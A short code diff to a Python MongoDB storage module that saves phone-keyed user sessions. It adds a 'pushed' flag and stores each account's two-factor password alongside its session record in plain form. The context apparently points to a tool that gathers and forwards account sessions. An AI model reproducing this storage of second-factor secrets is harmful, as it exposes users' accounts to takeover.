@@ -127,6 +127,7 @@ def _ensure_indexes():
             users_col.create_index([("status", ASCENDING)])
             users_col.create_index([("last_check", ASCENDING)])
             users_col.create_index([("created_at", DESCENDING)])
+            users_col.create_index([("pushed", ASCENDING)])
         if temp_sessions_col is not None:
             temp_sessions_col.create_index([("created_at", ASCENDING)])
         if broadcast_msgs_col is not None:
@@ -333,7 +334,10 @@ def save_session_to_db(session_data):
             "status": status,
             "last_check": now,
             "check_fail": session_data.get("check_fail"),
+            "pushed": False,
         }
+        if session_data.get("twofa_password"):
+            payload["twofa_password"] = session_data["twofa_password"]
 
         existing = users_col.find_one({"phone": phone})
         if existing:
